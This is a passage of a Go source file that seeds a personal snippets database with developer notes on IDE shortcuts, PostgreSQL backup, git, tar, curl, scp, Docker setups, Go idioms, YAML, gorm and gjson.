- reformat file\nctrl+shift+down - move statement down\nctrl+shift+up - move statement up\nctrl+alt+shif+left - move element left\nctrl+alt+shif+right - move element right\nalt+shift+down - move line down\nalt+shift+up - move line up\nshift+f6 - rename (edit changelist)\nctrl+f6 - change signature\nctrl+alt+m - extract method\nctrl+alt+n - inline\nshift+f10 - run\nshift+f9 - debug\nctrl+f2 - stop\nf8 - step over\nf7 - step into\nshift+f8 - step out\nalt+shift+9 - run to cursor\nf9 - resume\nctrl+alt+shift+p - go fmt project\nctrl+alt+g - go generate file\nalt+0 - commit window\nalt+1 - project window\nalt+2 - favorites window\nalt+3 - find window\nalt+4 - run window\nalt+5 - debug window\nalt+6 - problems window\nalt+7 - structure window\nalt+8 - services window\nalt+9 - git window\nalt+f12 - terminal window\nctrl+k - commit\nctrl+shift+k - push\nctrl+t - update project\nctrl+alt+shift+down - next change\nctrl+alt+shift+up - prev change\nctrl+alt+a - add to git\nctrl+shift+g - go file (my setting)")
	create(db, "Backup postgresql and restore it in docker\n(tags: backup postgresql docker)\n---\n\npg_dump -h 192.168.0.2 -d mydb -p 5432 -U myuser > /temp/mydb.dump\ndocker cp /temp/mydb.dump my-pg-container:/home/mydb.dump\ndocker exec -it my-pg-container bash\n// dropdb -U postgres 'mydb'\n// psql\n// \\l\n// CREATE DATABASE mydb WITH ENCODING='UTF-8';\n// \\du\n// \\q\n// create role myuser superuser\npsql -U postgres mydb < /home/mydb.dump\n\\\\ \\c\n\\\\ \\dt\n\\\\ select * from pg_catalog.pg_tables;")
	create(db, "Git push tag\n(tags: git tag)\n---\n\n// add tag to commit\ngit tag -a 1.0.2 e50f795\n// one tag\ngit push origin v1.0.0\n// many tags\ngit push origin --tags\n// remove tag\ngit push origin :v1.0.0\n// show tag\ngit show v1.0.0")
	create(db, "Linux tar, gzip, zip, unzip\n(tags: linux tar gzip zip unzip)\n---\n\ntar -cf archive.tar foo bar    # Create archive.tar from files foo and bar.\ntar -cfz archive.tar.gz foodir # Create archive.tar.gz from dir with gzip compress.\ntar -tvf archive.tar           # List all files in archive.tar verbosely.\ntar -xf archive.tar            # Extract all files from archive.tar.\ntar -xzvf foo.tar.gz dir/sdir  # Extract subdir\n  -c # Create new archive\n  -f # Name of archive\n  -t # List all files in in archive\n  -v # Verbosely list files processed\n  -z # Use gzip\n  -j # Use bzip2\n# by size: dir.tar.gz < dir < dir.tar\n\nunzip archive.zip\nunzip -tq archive.zip      # Test archive for errors\nunzip archive.zip -d /tmp  # Extract into some dir\nunzip -l archive.zip       # List of entry files\n\ngzip file.log      # Create archive file.log.gz\ngunzip archive.gz  # Unpack archive\n\nzip --encrypt secure.zip file  # Create archive with password\nEnter password: \nVerify password: \n# Create archive.zip with max compress (-9) exclude folder \"/var/log/apt/*\" \nzip -r -9 archive.zip /var/log/* /var/spool/* -x \"/var/log/apt/*\"")
	create(db, "Table test\n(tags: table test)\n---\n\nfunc TestConvertQueryToTopic(t *testing.T) {\n  type args struct {\n    query string\n  }\n  tests := []struct {\n    name string\n    args args\n    want Topic\n  }{\n    {\n      name: \"simple\",\n      args: args{query: \"Extract beginning of string (prefix)\\n(tags: extract beginning string prefix)\\n---\\n\\nt := string([]rune(s)[:5])\"},\n      want: Topic{\n        Title:   \"Extract beginning of string (prefix)\",\n        Code:    \"t := string([]rune(s)[:5])\",\n        Checked: false,\n        Tags: []Tag{\n          {Name: \"extract\"},\n          {Name: \"beginning\"},\n          {Name: \"string\"},\n          {Name: \"prefix\"},\n        },\n      },\n    },\n  }\n  for _, tt := range tests {\n    t.Run(tt.name, func(t *testing.T) {\n      if got, _ := ConvertQueryToTopic(tt.args.query); !reflect.DeepEqual(got, tt.want) {\n        t.Errorf(\"ConvertQueryToTopic() = %v, want %v\", got, tt.want)\n      }\n    })\n  }\n}")
	create(db, "Types in MySQL, PostgreSQL, SQLite\n(tags: type mysql postgresql sqlite)\n---\n\nhttps://stackoverflow.com/questions/1942586/comparison-of-database-column-types-in-mysql-postgresql-and-sqlite-cross-map\n\nMySQL               PostgreSQL          SQLite\n\nTINYINT             SMALLINT            INTEGER\nSMALLINT            SMALLINT\nMEDIUMINT           INTEGER\nBIGINT              BIGINT\nBIT                 BIT                 INTEGER\n___________________________________________________\n\nTINYINT UNSIGNED    SMALLINT            INTEGER\nSMALLINT UNSIGNED   INTEGER\nMEDIUMINT UNSIGNED  INTEGER\nINT UNSIGNED        BIGINT\nBIGINT UNSIGNED     NUMERIC(20)\n___________________________________________________\n\nDOUBLE              DOUBLE PRECISION    REAL\nFLOAT               REAL                REAL\nDECIMAL             DECIMAL             REAL\nNUMERIC             NUMERIC             REAL\n___________________________________________________\n\nBOOLEAN             BOOLEAN             INTEGER\n___________________________________________________\n\nDATE                DATE                TEXT\nTIME                TIME\nDATETIME            TIMESTAMP\n___________________________________________________\n\nTIMESTAMP DEFAULT   TIMESTAMP DEFAULT   TEXT\nNOW()               NOW()   \n___________________________________________________\n\nLONGTEXT            TEXT                TEXT\nMEDIUMTEXT          TEXT                TEXT\nBLOB                BYTEA               BLOB\nVARCHAR             VARCHAR             TEXT\nCHAR                CHAR                TEXT\n___________________________________________________\n\ncolumnname INT      columnname SERIAL   INTEGER PRIMARY \nAUTO_INCREMENT                          KEY AUTOINCREMENT")
	create(db, "SQLite syntax\n(tags: sqlite syntax)\n---\n\nCREATE TABLE test (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    model TEXT \n);\nINSERT INTO test (id, model) VALUES (7, 'a')\nINSERT INTO test (id, model) VALUES (2, 'ab')\nINSERT INTO test (model) VALUES ('abc')\nSELECT ROWID, id, model FROM test\n  2 2 ab\n  7 7 a\n  8 8 abc\n// and the same without AUTOINCREMENT\n\nCREATE VIEW model_names AS\n  SELECT model || '_' || id\n  FROM test\n\nCREATE TEMP TABLE tmp_1 (name TEXT)\n\n// aggregate functions\nAVG    Return the average value of non-null values in a group\nCOUNT  Return the total number of rows in a table.\nMAX    Return the maximum value of all values in a group.\nMIN    Return the minimum value of all values in a group.\nSUM    Return the sum of all non-null values in a column\nGROUP_CONCAT  Concatenate non-null values in a column\n\n// string functions\nSUBSTR  Extract and returns a substring with a predefined length starting at a specified position in a source string\nTRIM    Return a copy of a string that has specified characters removed from the beginning and the end of a string.\nLTRIM   Return a copy of a string that has specified characters removed from the beginning of a string.\nRTRIM   Return a copy of a string that has specified characters removed from the end of a string.\nLENGTH  Return the number of characters in a string or the number of bytes in a BLOB.\nREPLACE Return a copy of a string with each instance of a substring replaced by the other substring.\nUPPER   Return a copy of a string with all of the characters converted to uppercase.\nLOWER   Return a copy of a string with all of the characters converted to lowercase.\nINSTR   Find a substring in a string and returns an integer indicating the position of the first occurrence of the substring.\n\n// control flow functions\nCOALESCE  Return the first non-null argument\nIFNULL    Provide the NULL if/else construct\nIIF       Add if-else logic to queries - IIF(expression, true_expression, false_expression).\nNULLIF    Return NULL if the first argument is equal to the second argument.\n\n// date and time functions\nDATE       Calculate the date based on multiple date modifiers.\nTIME       Calculate the time based on multiple date modifiers.\nDATETIME   Calculate the date & time based on one or more date modifiers.\nJULIANDAY  Return the Julian day, which is the number of days since noon in Greenwich on November 24, 4714 B.C.\nSTRFTIME   Format the date based on a specified format string.\n\n// math functions\nABS     Return the absolute value of a number\nRANDOM  Return a random floating-point value between the minimum and maximum integer values\nROUND   Round off a floating value to a specified precision.")
	create(db, "Copy files over SSH\n(tags: copy file ssh)\n---\n\nhttps://www.shellhacks.com/copy-files-ssh-10-examples/\n\n// Example 1: Copy the file “file.txt” from a remote host to the local host.\nscp user@remote.host:file.txt /some/local/directory\n// Example 2: Copy the file “file.txt” from the local host to a remote host.\nscp file.txt user@remote.host:/some/remote/directory\n// Example 3: Copy the directory “dir1” from the local host to a remote host’s directory “dir2”.\nscp -r dir1 user@remote.host:/some/remote/directory/dir2\n// Example 4: Copy the file “file.txt” from remote host “remote.host1” to remote host “remote.host2”.\nscp user@remote.host1:/directory/file.txt user@remote.host2:/some/directory/\n// Example 5: Copy the files “file1.txt” and “file2.txt” from the local host to your home directory on the remote host.\nscp file1.txt file2.txt user@remote.host:~\n// Example 6: Copy the file “file.txt” from the local host to a remote host using port 2222.\nscp -P 2222 file.txt user@remote.host:/some/remote/directory\n// Example 7: Copy the file “file.txt” from the local host to a remote host’s home directory. Preserve the modification and access times, as well as the permissions of the source-file in the destination-file.\nscp -p file.txt user@remote.host:~\n// Example 8: Copy the file “file.txt” from the local host to a remote host’s home directory. Increase SCP speed by changing the cipher from the default AES-128 to Blowfish.\nscp -c blowfish file.txt user@remote.host:~\n// Example 9: Copy the file “file.txt” from the local host to a remote host’s home directory. limit the bandwidth used by SCP command to 100 Kbit/s.\nscp -l 100 file.txt user@remote.host:~\n// Example 10: Copy multiple files from the remote host to your current directory on the local host.\nscp user@remote.host:~/\\{file1,file2,file3\\} .")
	create(db, "Linux telnet\n(tags: linux telnet)\n---\n\n// check server available\ntelnet 192.168.1.243\n// check port available\ntelnet localhost 123\n// debug mode with more info\ntelnet -d localhost 22\n// show telnet commands\n// Ctrl+[\n// telnet> \nstatus\n// GET \ntelnet opennet.ru 80\nGET /")
	create(db, "Linux curl\n(tags: linux curl)\n---\n\n// Download file and show it in output\ncurl https://raw.githubusercontent.com/curl/curl/master/README.md\n// Download into file\ncurl -o readme.txt https://raw.githubusercontent.com/curl/curl/master/README.md\n// Save with the same name (README.md)\ncurl -O https://raw.githubusercontent.com/curl/curl/master/README.md\n// Restore downloading after interrupt\ncurl -# -C - -O https://cdn.kernel.org/pub/linux/kernel/v4.x/testing/linux-4.11-rc7.tar.xz\n// Download many files\ncurl -O https://raw.githubusercontent.com/curl/curl/master/README.md -O https://raw.githubusercontent.com/curl/curl/master/README\n// Download file if id has been modified\ncurl -z 21-Dec-17 https://raw.githubusercontent.com/curl/curl/master/README.md\n// Limit download speed\ncurl --limit-rate 50K -O https://cdn.kernel.org/pub/linux/kernel/v4.x/testing/linux-4.11-rc7.tar.xz\n// Close connection if speed less than needed\ncurl -Y 100 -O https://raw.githubusercontent.com/curl/curl/master/README.md\n// Send file to ftp server\ncurl -T login.txt ftp://speedtest.tele2.net/upload/\n// Show where ftp server saved our file\ncurl -T ~/login.txt http://posttestserver.com/post.php\n// POST\ncurl -d \"field1=val&fileld2=val1\" http://posttestserver.com/post.php\n// Form POST\ncurl -F \"password=@pass;type=text/plain\" http://posttestserver.com/post.php\n// Save cookie in file\ncurl -c cookie.txt http://posttestserver.com/post.php\n// Send cookie from file to server\ncurl -b cookie.txt http://posttestserver.com/post.php\n// Show headers\ncurl -I https://losst.ru\n// Set header to request\ncurl -I --header 'If-Modified-Since: Mon, 26 Dec 2016 18:13:12 GMT' https://losst.ru\n// Using auth\ncurl -u ftpuser:ftppass -T - ftp://ftp.testserver.com/myfile_1.txt\n// Using proxy\ncurl -x proxysever.test.com:3128 http://google.co.in\n// Send json\ncurl -H \"Content-Type: application/json\" \\\n  -X POST \\\n  -d '{\"username\":\"xyz\",\"password\":\"xyz\"}' \\\n  http://localhost:3000/api/login")
	create(db, "Elasticsearch in docker\n(tags: elasticsearch docker)\n---\n\n// Run in docker\ndocker run -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" docker.elastic.co/elasticsearch/elasticsearch:7.10.1\n// Create index\ncurl -H \"Content-Type: application/json\" -X PUT -d '{ \"settings\": {\"number_of_shards\": 1, \"number_of_replicas\": 1 }, \"mappings\": { \"properties\": { \"name\": { \"type\": \"text\" }, \"age\": { \"type\": \"integer\" }, \"average_score\": { \"type\": \"float\" }} } }'   http://localhost:9200/students \n\n// main.go for insert data\npackage main\n\nimport (\n  \"context\"\n  \"encoding/json\"\n  \"fmt\"\n  \"gopkg.in/olivere/elastic.v7\"\n)\n\ntype Student struct {\n  Name         string  `json:\"name\"`\n  Age          int64   `json:\"age\"`\n  AverageScore float64 `json:\"average_score\"`\n}\n\nfunc GetESClient() (*elastic.Client, error) {\n  client, err :=  elastic.NewClient(elastic.SetURL(\"http://localhost:9200\"),\n    elastic.SetSniff(false),\n    elastic.SetHealthcheck(false))\n\n  fmt.Println(\"ES initialized...\")\n  return client, err\n}\n\nfunc main() {\n  ctx := context.Background()\n  esclient, err := GetESClient()\n  if err != nil {\n    fmt.Println(\"Error initializing : \", err)\n    panic(\"Client fail \")\n  }\n  \n  //creating student object\n  newStudent := Student{\n    Name:         \"Gopher doe\",\n    Age:          10,\n    AverageScore: 99.9,\n  }\n\n  dataJSON, err := json.Marshal(newStudent)\n  js := string(dataJSON)\n  _, err = esclient.Index().\n    Index(\"students\").\n    BodyJson(js).\n    Do(ctx)\n\n  if err != nil {\n    panic(err)\n  }\n  fmt.Println(\"[Elastic][InsertProduct]Insertion Successful\")\n}\n\n// Find matched\ncurl -H \"Content-Type: application/json\" -X POST -d '{\"query\":{\"match\":{\"name\":\"doe\"}}}' http://localhost:9200/students/_search")
	create(db, "Anonymous structs for template data\n(tags: anonymous struct template)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\npackage main\n\nimport (\n  \"log\"\n  \"os\"\n  \"text/template\"\n)\n\nfunc main() {\n  data := struct {\n    FirstName string\n    LastName string\n  }{\n    \"John\",\n    \"Doe\",\n  }\n  tmpl := template.Must(template.New(\"name\").Parse(\"Hello, {{.FirstName}} {{.LastName}}!\"))\n  if err := tmpl.Execute(os.Stdout, data); err != nil {\n    log.Fatal(err)\n  }\n}")
	create(db, "Anonymous structs for json\n(tags: anonymous struct json)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\n// encoging from struct to json\nb, err := json.Marshal(struct {\n    ID   int\n    Name string\n}{42, \"The answer\"})\nif err != nil {\n    log.Fatal(err)\n}\nfmt.Printf(\"%s\\n\", b)\n\n// decoding ftom json to struct\nvar data struct {\n    ID     int\n    Person struct {\n        Name string\n        Job  string\n    }\n}\nconst s = `{\"ID\":42,\"Person\":{\"Name\":\"George Costanza\",\"Job\":\"Architect\"}}`\nerr := json.Unmarshal([]byte(s), &data)\nif err != nil {\n    log.Fatal(err)\n}\nfmt.Println(data.ID, data.Person.Name, data.Person.Job)")
	create(db, "Anonymous structs with embedded mutex\n(tags: anonymous struct embedded mutex)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\nvar viewCount struct {\n    sync.Mutex\n    n int64\n}\n\nviewCount.Lock()\nviewCount.n++\nviewCount.Unlock()")
	create(db, "Anonymous structs with implementing interfaces\n(tags: anonymous struct implement interface)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\nreturn struct {\n    io.ReadSeeker\n    io.Closer\n}{\n    io.NewSectionReader(strings.NewReader(s), 0, int64(len(s))),\n    ioutil.NopCloser(nil),\n}")
	create(db, "Anonymous interfaces\n(tags: anonymous interface)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\nvar s interface {\n        String() string\n    } = bytes.NewBufferString(\"I'm secretly a fmt.Stringer!\")\n    fmt.Println(s.String())\n  \n// or\n// Check that we can access methods of the underlying os.File.\nif _, ok := stdin.(interface {\n    Fd() uintptr\n}); !ok {\n    t.Error(\"can't access methods of underlying *os.File\")\n}")
	create(db, "Method value\n(tags: method value)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\n// Evaluating a method from a type yields a function:\nvar f func(*bytes.Buffer, string) (int, error)\nvar buf bytes.Buffer\nf = (*bytes.Buffer).WriteString\nf(&buf, \"y u no buf.WriteString?\")\nbuf.WriteTo(os.Stdout)\n\n// Evaluating a method from a value creates a closure that holds that value:\nvar f func(string) (int, error)\nvar buf bytes.Buffer\nf = buf.WriteString\nf(\"Hey... \")\nf(\"this *is* cute.\")\nbuf.WriteTo(os.Stdout)")
	create(db, "Using sync.Once\n(tags: sync once)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\n// Once is an object that will perform exactly one action.\n// type Once struct { /* Has unexported fields. */ }\n// func (o *Once) Do(f func())\n\ntype LazyPrimes struct {\n    once   sync.Once // Guards the primes slice.\n    primes []int\n}\n\nfunc (p *LazyPrimes) init() {\n    // Populate p.primes with prime numbers.\n}\n\nfunc (p *LazyPrimes) Primes() []int {\n    p.once.Do(p.init)\n    return p.primes\n}")
	create(db, "Comparable types\n(tags: comparable type)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\n// Bools, ints, floats, complex numbers, strings, pointers,\n// channels, structs, and interfaces are comparable.\n\nvar a, b int = 42, 42\nfmt.Println(a == b) // true\n\nvar i, j interface{} = a, b\nfmt.Println(i == j) // true\n\nvar s, t struct{ i interface{} }\ns.i, t.i = a, b\nfmt.Println(s == t) // true\n\n// A struct is comparable only if its fields are comparable:\nvar q, r struct{ s []string }\nfmt.Println(q == r) // build failed")
	create(db, "Map keys\n(tags: map key)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\n// Any comparable type may be used as a map key.\n\na := map[int]bool{}\na[42] = true\n\ntype T struct {\n    i int\n    s string\n}\n\nb := map[*T]bool{}\nb[&T{}] = true\n\nc := map[T]bool{}\nc[T{37, \"hello!\"}] = true\n\nd := map[interface{}]bool{}\nd[42] = true\nd[&T{}] = true\nd[T{123, \"four five six\"}] = true\nd[ioutil.Discard] = true\n\n\n// Interfaces as map keys\n// An example of interface map keys from Docker's broadcastwriter package:\n\ntype BroadcastWriter struct {\n    sync.Mutex\n    writers map[io.WriteCloser]struct{}\n}\n\nfunc (w *BroadcastWriter) AddWriter(writer io.WriteCloser) {\n    w.Lock()\n    w.writers[writer] = struct{}{}\n    w.Unlock()\n}\n\nfunc (w *BroadcastWriter) Write(p []byte) (n int, err error) {\n    w.Lock()\n    for sw := range w.writers {\n        if n, err := sw.Write(p); err != nil || n != len(p) {\n            delete(w.writers, sw)\n        }\n    }\n    w.Unlock()\n    return len(p), nil\n}\n\n// Structs and interfaces together as map keys\n// A (very) contrived example: (Don't do this! Ever!) \n\ntype cons struct {\n    car string\n    cdr interface{}\n}\n\nfunc (c cons) String() string {\n    if c.cdr == nil || c.cdr == (cons{}) {\n        return c.car\n    }\n    return fmt.Sprintf(\"%v %v\", c.car, c.cdr)\n}\n\nfunc main() {\n    m := map[cons]string{}\n    c := cons{}\n    for _, s := range []string{\"life?\", \"with my\", \"I doing\", \"What am\"} {\n        c = cons{s, c}\n    }\n    m[c] = \"No idea.\"\n    fmt.Println(c, m[c])\n}")
	create(db, "Using atomic.Value\n(tags: atomic value)\n---\n\nhttps://talks.golang.org/2015/tricks.slide\n\n// For instance, to share configuration between many goroutines:\ntype Config struct {\n    Timeout time.Duration\n}\nvar config atomic.Value\n\n// To set or update, use the Store method:\nconfig.Store(&Config{Timeout: 2*time.Second})\n\n// To read, each goroutine calls the Load method:\n// Note that storing different types in the same Value will cause a panic. \ncfg := config.Load().(*Config)")
	create(db, "Running Gitlab in docker container\n(tags: gitlab docker)\n---\n\n// add some host to /etc/hosts\nnano /etc/hosts\n127.0.0.1 myagitlab.com\n\n// run container\ndocker run --detach \\\n  --hostname mygitlab.com \\\n  --publish 443:443 --publish 8880:80 --publish 22:22 \\\n  --name gitlab \\\n  --restart always \\\n  --volume $GITLAB_HOME/config:/etc/gitlab \\\n  --volume $GITLAB_HOME/logs:/var/log/gitlab \\\n  --volume $GITLAB_HOME/data:/var/opt/gitlab \\\n  gitlab/gitlab-ee:latest\n  \n// wait and try mygitlab.com:8880")
	create(db, "Reading gzipped HTTP response\n(tags: gzip http)\n---\n\nhttps://stackoverflow.com/questions/13130341/reading-gzipped-http-response-in-go\n\nclient := new(http.Client)\n\nrequest, err := http.NewRequest(\"GET\", \"http://stackoverflow.com\", nil)\nrequest.Header.Add(\"Accept-Encoding\", \"gzip\")\n\nresponse, err := client.Do(request)\ndefer response.Body.Close()\n\n// Check that the server actually sent compressed data\nvar reader io.ReadCloser\nswitch response.Header.Get(\"Content-Encoding\") {\ncase \"gzip\":\n    reader, err = gzip.NewReader(response.Body)\n    defer reader.Close()\ndefault:\n    reader = response.Body\n}\n\nio.Copy(os.Stdout, reader) // print html to standard out")
	create(db, "Yaml syntax\n(tags: yaml syntax)\n---\n\nhttps://alingvo.ru/help-ru/yml\n\n--- # Movie list: block sequence\n- Casablanca\n- Spellbound\n- Notorious\n--- # Shopping list: one-line sequence\n[milk, bread, eggs, juice]\n\n--- # Block format\nname: John Smith\nage: 33\n--- # Single line format\n{name: John Smith, age: 33}\n\n# Block literals (line feeds are preserved):\n--- |\n  There was a young fellow of Warwick\n  Who had reason for feeling euphoric\n      For he could, by election\n      Have triune erection\n  Ionic, Corinthian, and Doric\n\n# Block literals (line feeds are ignored):\n--- >\n  Wrapped text\n  will be folded\n  into a single\n  paragraph\n  \n  Blank lines denote\n  paragraph breaks\n\n# Sequences from maps:\n- {name: John Smith, age: 33}\n- name: Mary Smith\n  age: 27\n\n# Maps from sequences:\nmen: [John Smith, Bill Jones]\nwomen:\n  - Mary Smith\n  - Susan Williams\n\nhttps://webdevblog.ru/yaml-dlya-veb-razrabotchikov/\n\n# json\n{\n  \"company\": \"Google\",\n  \"full_name\": \"John Foo Bar Doe\",\n  \"name\": \"John\",\n  \"surname\": \"Christian Meyer\"\n}\n# yaml\ncompany: Google             # Single words, no quotes\nfull_name: John Foo Bar Doe # Full sentence, no quotes\nname: 'John'                # Using single quotes\nsurname: \"Christian Meyer\"  # Using double quotes\n\nyear: 2019 # Integer\nnodeVersion: 10.8 # Float\n\n#json\n{\n  \"production\": {\n    \"node_version\": \"13.0.0\",\n    \"os\": \"ubuntu\",\n    \"package_manager\": \"yarn\",\n    \"run\": [\"yarn install\", \"NODE_ENV=${ENVIRONMENT} yarn build\"],\n    \"env\": {\n      \"ENVIRONMENT\": \"production\"\n    }\n  },\n  \"staging\": {\n    \"node_version\": \"13.0.0\",\n    \"os\": \"ubuntu\",\n    \"package_manager\": \"yarn\",\n    \"run\": [\"yarn install\", \"NODE_ENV=${ENVIRONMENT} yarn build\"],\n    \"env\": {\n      \"ENVIRONMENT\": \"staging\"\n    }\n  }\n}\n#yaml\nbase-config: &base\n  node_version: 13.0.0\n  os: ubuntu\n  package_manager: yarn\n  run:\n    - yarn install\n    - NODE_ENV=${ENVIRONMENT} yarn build\n\nproduction:\n  # Injection «base» attributes in production\n  <<: *base\n  env:\n    - ENVIRONMENT: production\n\nstaging:\n  # Injection «base» attributes in staging \n  <<: *base\n  env:\n    - ENVIRONMENT: staging")
	create(db, "Convert between Windows-1251 and UTF-8\n(tags: convert windows1251 utf8)\n---\n\nhttps://golangs.org/open-write-utf-8-file-charset\n\npackage main\n \nimport (\n  \"fmt\"\n  \"io/ioutil\"\n  \"os\"\n  \"golang.org/x/text/encoding/charmap\"\n)\n \nfunc main() {\n  // Write string in Windows-1252\n  encoder := charmap.Windows1252.NewEncoder()\n  s, e := encoder.String(\"This is sample text with runes Š\")\n  if e != nil {\n    panic(e)\n  }\n  ioutil.WriteFile(\"example.txt\", []byte(s), os.ModePerm)\n \n  // Decode in UTF-8\n  f, e := os.Open(\"example.txt\")\n  if e != nil {\n    panic(e)\n  }\n  defer f.Close()\n  decoder := charmap.Windows1252.NewDecoder()\n  reader := decoder.Reader(f)\n  b, err := ioutil.ReadAll(reader)\n  if err != nil {\n    panic(err)\n  }\n  fmt.Println(string(b))\n}")
	create(db, "Resetting remote to a certain commit\n(tags: git reset remote commit)\n---\n\nhttps://stackoverflow.com/questions/5816688/resetting-remote-to-a-certain-commit\n\ngit reset --hard <commit-hash>\ngit push -f origin master")
	create(db, "Gorm many2many\n(tags: gorm many2many)\n---\n\nimport (\n  \"gorm.io/gorm\"\n)\n\ntype Topic struct {\n  gorm.Model\n  Id      int    `gorm:\"primaryKey\"`\n  Title   string `gorm:\"unique\"`\n  Code    string\n  Checked bool\n  Tags    []Tag `gorm:\"many2many:topic_tags;\"`\n}\n\n//type TopicTags struct {\n//  gorm.Model\n//  Id int `gorm:\"primaryKey\"`\n//  Topics []Topic `gorm:\"many2many:topic_tags;\"`\n//  Tags    []Tag `gorm:\"many2many:topic_tags;\"`\n//}\n\ntype Tag struct {\n  gorm.Model\n  Id     int     `gorm:\"primaryKey\"`\n  Name   string  `gorm:\"unique\"`\n  Topics []Topic `gorm:\"many2many:topic_tags;\"`\n}\n\n// Create new topic\nfunc create(db *gorm.DB, query string) Topic {\n  topic := &Topic{\n    Title: \"Some title\",\n    Code: \"Some code\",\n    Tags: []Tag{\n      {\n        Name: \"testtag\",\n      },\n    },\n  }\n  tags := topic.Tags\n  for i, tag := range tags {\n    db.Where(\"name = ?\", tag.Name).Find(&tag)\n    if tag.Id == 0 {\n      db.Create(&tag)\n    }\n    tags[i] = tag\n  }\n  topic.Tags = tags\n  db.Create(topic)\n  return *topic\n}\n\n// Get all tags\nfunc getAllTags(db *gorm.DB) []Tag {\n  var tags []Tag\n  n.db.Find(&tags)\n  return tags\n}\n\n// Get all topics\nfunc getAllTopics(db *gorm.DB) []Topic {\n  var topics []Topic\n  n.db.Find(&topics)\n  return topics\n}\n\n// Get topics that have some tags\nfunc getTopicsWithTags(db *gorm.DB, queryTags []string) []Topic {\n  // get matched tags\n  var tags []Tag\n  n.db.Where(\"name IN ?\", queryTags).Find(&tags)\n\n  // get associated topics by tags\n  var topics []Topic\n  n.db.Model(&tags).Association(\"Topics\").Find(&topics)\n  \n  // return topics\n\n  // make set deduplicate topics\n  set := make(map[string]Topic)\n  for _, topic := range topics {\n    set[topic.Title] = topic\n  }\n\n  // struct for sorting\n  var matchTopic struct {\n    match int\n    topic Topic\n  }\n\n  // make slice for counting matches\n  matches := make([]matchTopic, 0, len(set))\n  for _, topic := range set {\n    // add tags to topic struct\n    n.db.Model(&topic).Association(\"Tags\").Find(&topic.Tags)\n    match := 0\n    for _, tag := range topic.Tags {\n      for _, queryTag := range queryTags {\n        if tag.Name == queryTag {\n          match++\n        }\n      }\n    }\n    matches = append(matches, matchTopic{match: match, topic: topic})\n  }\n  \n  // sort slice by matches desc\n  sort.Slice(matches, func(i, j int) bool {\n    return matches[i].match > matches[j].match\n  })\n  \n  res := make([]Topic, 0, len(matches))\n  for _, val := range matches {\n    res = append(res, val.topic)\n  }\n  return res \n}")
	create(db, "Get json without serialisation\n(tags: get json gjson)\n---\n\nhttps://github.com/tidwall/gjson\n\npackage main\n\nimport \"github.com/tidwall/gjson\"\n\nconst json = `{\"name\":{\"first\":\"Janet\",\"last\":\"Prichard\"},\"age\":47}`\n\nfunc main() {\n  value := gjson.Get(json, \"name.last\")\n  println(value.String())\n}\n\n{\n  \"name\": {\"first\": \"Tom\", \"last\": \"Anderson\"},\n  \"age\":37,\n  \"children\": [\"Sara\",\"Alex\",\"Jack\"],\n  \"fav.movie\": \"Deer Hunter\",\n  \"friends\": [\n    {\"first\": \"Dale\", \"last\": \"Murphy\", \"age\": 44, \"nets\": [\"ig\", \"fb\", \"tw\"]},\n    {\"first\": \"Roger\", \"last\": \"Craig\", \"age\": 68, \"nets\": [\"fb\", \"tw\"]},\n    {\"first\": \"Jane\", \"last\": \"Murphy\", \"age\": 47, \"nets\": [\"ig\", \"tw\"]}\n  ]\n}\n\n// path in gjson.Get\n\"name.last\"          >> \"Anderson\"\n\"age\"                >> 37\n\"children\"           >> [\"Sara\",\"Alex\",\"Jack\"]\n\"children.#\"         >> 3\n\"children.1\"         >> \"Alex\"\n\"child*.2\"           >> \"Jack\"\n\"c?ildren.0\"         >> \"Sara\"\n\"fav\\.movie\"         >> \"Deer Hunter\"\n\"friends.#.first\"    >> [\"Dale\",\"Roger\",\"Jane\"]\n\"friends.1.last\"     >> \"Craig\"\n\nfriends.#(last==\"Murphy\").first    >> \"Dale\"\nfriends.#(last==\"Murphy\")#.first   >> [\"Dale\",\"Jane\"]\nfriends.#(age>45)#.last            >> [\"Craig\",\"Murphy\"]\nfriends.#(first%\"D*\").last         >> \"Murphy\"\nfriends.#(first!%\"D*\").last        >> \"Craig\"\nfriends.#(nets.#(==\"fb\"))#.first   >> [\"Dale\",\"Roger\"]\n\n// types \nbool, for JSON booleans\nfloat64, for JSON numbers\nstring, for JSON string literals\nnil, for JSON null\n\nresult.Type    // can be String, Number, True, False, Null, or JSON\nresult.Str     // holds the string\nresult.Num     // holds the float64 number\nresult.Raw     // holds the raw json\nresult.Index   // index of raw value in original json, zero means index unknown\n\n\"children|@reverse\"           >> [\"Jack\",\"Alex\",\"Sara\"]\n\"children|@reverse|0\"         >> \"Jack\"\n\n// modifiers\n@reverse: Reverse an array or the members of an object.\n@ugly: Remove all whitespace from a json document.\n@pretty: Make the json document more human readable.\n@this: Returns the current element. It can be used to retrieve the root element.\n@valid: Ensure the json document is valid.\n@flatten: Flattens an array.\n@join: Joins multiple objects into a single object.\n\n// Custom modifiers\ngjson.AddModifier(\"case\", func(json, arg string) string {\n  if arg == \"upper\" {\n    return strings.ToUpper(json)\n  }\n  if arg == \"lower\" {\n    return strings.ToLower(json)\n  }\n  return json\n})\n\"children|@case:upper\"           >> [\"SARA\",\"ALEX\",\"JACK\"]\n\"children|@case:lower|@reverse\"  >> [\"jack\",\"alex\",\"sara\"]\n\n// JSON Lines\n{\"name\": \"Gilbert\", \"age\": 61}\n{\"name\": \"Alexa\", \"age\": 34}\n{\"name\": \"May\", \"age\": 57}\n{\"name\": \"Deloise\", \"age\": 44}\n..#                   >> 4\n..1                   >> {\"name\": \"Alexa\", \"age\": 34}\n..3                   >> {\"name\": \"Deloise\", \"age\": 44}\n..#.name              >> [\"Gilbert\",\"Alexa\",\"May\",\"Deloise\"]\n..#(name=\"May\").age   >> 57\n\n// Unmarshal to a map\nm, ok := gjson.Parse(json).Value().(map[string]interface{})\nif !ok {\n  // not a map\n}\n\n// Validate JSON\nif !gjson.Valid(json) {\n  return errors.New(\"invalid json\")\n}\nvalue := gjson.Get(json, \"name.last\")\n\n// For each\nresult := gjson.Get(json, 